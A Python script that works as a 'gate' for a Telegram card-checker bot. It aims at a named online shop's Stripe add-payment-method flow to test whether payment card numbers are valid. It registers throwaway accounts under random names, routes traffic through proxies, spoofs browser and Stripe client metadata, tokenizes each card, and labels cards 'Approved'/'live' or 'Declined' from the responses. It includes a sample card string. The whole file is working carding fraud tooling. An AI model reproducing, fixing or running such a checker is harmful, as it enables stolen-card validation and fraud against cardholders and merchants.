"""
AU Gate Engine - Fixed Stripe PaymentMethod Payload with modern client_attribution_metadata
Target: shop.mydario.com (Stripe SetupIntent Auth)
"""
import sys
if hasattr(sys.stdout, 'reconfigure'):
    sys.stdout.reconfigure(encoding='utf-8')
import asyncio
import aiohttp
import time
import json
import random
import re
import uuid

def _format_proxy(p):
    if not p:
        return None
    ps = str(p).strip()
    if ps.startswith(("http://", "https://", "socks5://", "socks4://")):
        return ps
    parts = ps.split(":")
    if len(parts) == 4:
        if parts[1].isdigit():
            return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        elif parts[3].isdigit():
            return f"http://{parts[0]}:{parts[1]}@{parts[2]}:{parts[3]}"
        else:
            return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    elif len(parts) == 2:
        return f"http://{parts[0]}:{parts[1]}"
    return f"http://{ps}"

def _parse_between(text, start, end):
    try:
        s = text.split(start, 1)[1]
        return s.split(end, 1)[0]
    except Exception:
        return None

async def check_card_au(cc: str, mm: str, yy: str, cvc: str, proxy_url: str | None = None) -> tuple[bool, str, str, str]:
    proxy_url = _format_proxy(proxy_url)
    if len(yy) == 2:
        yy = "20" + yy
    mm = mm.zfill(2)

    first_names = ["James", "Robert", "John", "Michael", "David", "William", "Richard", "Joseph", "Thomas", "Charles"]
    last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
    first = random.choice(first_names)
    last = random.choice(last_names)
    email = f"{first.lower()}.{last.lower()}{random.randint(100,999)}@gmail.com"

    user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"

    headers_dario = {
        'authority': 'shop.mydario.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
        'user-agent': user_agent,
    }

    connector = aiohttp.TCPConnector(ssl=False)
    timeout = aiohttp.ClientTimeout(total=25)

    try:
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            # 1. Fetch Register Nonce from My Account
            async with session.get('https://shop.mydario.com/my-account/', headers=headers_dario, proxy=proxy_url) as r1:
                html1 = await r1.text()
            
            nonce_reg = _parse_between(html1, 'name="woocommerce-register-nonce" value="', '"')
            if not nonce_reg:
                nonce_reg = _parse_between(html1, 'id="woocommerce-register-nonce" name="woocommerce-register-nonce" value="', '"')
            if not nonce_reg:
                return False, "Error! ⚠️", "Failed to extract woocommerce-register-nonce", html1[:200]

            # 2. Register Account
            data_reg = {
                'email': email,
                'woocommerce-register-nonce': nonce_reg,
                '_wp_http_referer': '/my-account/',
                'register': 'Register'
            }
            headers_reg = {
                **headers_dario,
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://shop.mydario.com',
                'referer': 'https://shop.mydario.com/my-account/',
            }
            async with session.post('https://shop.mydario.com/my-account/', headers=headers_reg, data=data_reg, proxy=proxy_url) as r2:
                await r2.text()

            # 3. Get Add Payment Method page & extract add_card_nonce + publishable key
            headers_pm = {
                **headers_dario,
                'referer': 'https://shop.mydario.com/my-account/payment-methods/',
            }
            async with session.get('https://shop.mydario.com/my-account/add-payment-method/', headers=headers_pm, proxy=proxy_url) as r3:
                html3 = await r3.text()

            add_card_nonce = _parse_between(html3, '"add_card_nonce":"', '"')
            if not add_card_nonce:
                add_card_nonce = _parse_between(html3, 'name="woocommerce-add-payment-method-nonce" value="', '"')
            
            pk_match = re.search(r'pk_live_[a-zA-Z0-9]+', html3)
            stripe_pk = pk_match.group(0) if pk_match else 'pk_live_7IDldKRUXqo2d7gSwMA022p000G1tW0T8A'

            # 4. Tokenize Card on Stripe API (PaymentMethod with Elements surface metadata)
            stripe_headers = {
                'authority': 'api.stripe.com',
                'accept': 'application/json',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': user_agent,
            }
            
            guid = str(uuid.uuid4())
            muid = str(uuid.uuid4())
            sid = str(uuid.uuid4())

            stripe_data = {
                'type': 'card',
                'billing_details[name]': f"{first} {last}",
                'billing_details[email]': email,
                'billing_details[address][country]': 'US',
                'card[number]': cc,
                'card[cvc]': cvc,
                'card[exp_month]': mm,
                'card[exp_year]': yy,
                'allow_redisplay': 'unspecified',
                'payment_user_agent': 'stripe.js/f4aa9d6f0f; stripe-js-v3/f4aa9d6f0f; payment-element; deferred-intent',
                'referrer': 'https://shop.mydario.com',
                'time_on_page': str(random.randint(100000, 999999)),
                'client_attribution_metadata[client_session_id]': str(uuid.uuid4()),
                'client_attribution_metadata[merchant_integration_source]': 'elements',
                'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
                'client_attribution_metadata[merchant_integration_version]': '2021',
                'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
                'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
                'client_attribution_metadata[elements_session_config_id]': str(uuid.uuid4()),
                'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
                'guid': guid,
                'muid': muid,
                'sid': sid,
                'key': stripe_pk,
                '_stripe_version': '2024-06-20'
            }

            async with session.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data, proxy=proxy_url) as r_stripe:
                stripe_resp = await r_stripe.json()

            idpm = stripe_resp.get("id")
            if not idpm:
                err_msg = (stripe_resp.get("error") or {}).get("message", "Stripe PaymentMethod tokenization failed")
                return False, "DECLINED ❌", err_msg, json.dumps(stripe_resp)

            # 5. Create Setup Intent on Dario Store
            if not add_card_nonce:
                return False, "Error! ⚠️", f"PaymentMethod Tokenized ({idpm}) but add_card_nonce missing from Dario", ""

            setup_headers = {
                'authority': 'shop.mydario.com',
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'user-agent': user_agent,
                'x-requested-with': 'XMLHttpRequest',
                'origin': 'https://shop.mydario.com',
                'referer': 'https://shop.mydario.com/my-account/add-payment-method/',
            }
            setup_data = {
                'stripe_source_id': idpm,
                'nonce': add_card_nonce
            }
            async with session.post('https://shop.mydario.com/?wc-ajax=wc_stripe_create_setup_intent', headers=setup_headers, data=setup_data, proxy=proxy_url) as r_setup:
                setup_text = await r_setup.text()

            # 6. Parse and classify SetupIntent response
            try:
                setup_json = json.loads(setup_text)
            except Exception:
                setup_json = {}

            if "Your card's security code is incorrect" in setup_text or "incorrect_cvc" in setup_text:
                return True, "Approved! CNN 🟩", "Your card's security code is incorrect (CCN Live)", setup_text
            elif "insufficient_funds" in setup_text or "Insufficient funds" in setup_text:
                return True, "Approved! 🟩", "Insufficient funds (Card Live)", setup_text
            elif "success" in setup_text and setup_json.get("success") is True:
                return True, "Approved! 🟩", "SetupIntent Succeeded / Card Added", setup_text
            elif "card_error_authentication_required" in setup_text or "three_d_secure_redirect" in setup_text:
                return False, "DECLINED 🔴", "3D Secure Challenge Required", setup_text
            elif "do_not_honor" in setup_text:
                return False, "DECLINED 🔴", "Do Not Honor (Declined by Issuer)", setup_text
            elif "generic_decline" in setup_text:
                return False, "DECLINED 🔴", "Generic Decline", setup_text
            elif "transaction_not_allowed" in setup_text or "Your card does not support this type of purchase" in setup_text:
                return False, "DECLINED 🔴", "Transaction Not Allowed", setup_text
            else:
                msg = setup_json.get("data", {}).get("message") or setup_json.get("message") or _parse_between(setup_text, '"message":"', '"')
                return False, "DECLINED 🔴", msg if msg else "Payment Method Declined", setup_text

    except Exception as e:
        return False, "ERROR ⚠️", str(e), ""

if __name__ == '__main__':
    card_arg = sys.argv[1] if len(sys.argv) > 1 else "4033060047342909|08|28|667"
    p = card_arg.split('|')
    print(f"[*] Running Fixed Native Test of AU (/au) Gate on: {card_arg}")
    start = time.time()
    
    try:
        with open('alone_checker_bot/test_proxies.txt') as f:
            px_list = [line.strip() for line in f if line.strip()]
        selected_proxy = px_list[0] if px_list else None
    except Exception:
        selected_proxy = None
        
    is_live, status, response, raw = asyncio.run(check_card_au(p[0], p[1], p[2], p[3], proxy_url=selected_proxy))
    elapsed = round(time.time() - start, 2)
    
    print(f"""
=== TELEGRAM BOT OUTPUT (AU GATE) ===
Gate Auth: >_ Stripe Auth (SetupIntent $0.00)
----------------------------------------
Card: {card_arg}
Status: {status}
Response: {response}
----------------------------------------
Time: {elapsed}s | Gateway: Nova (AU)
""")
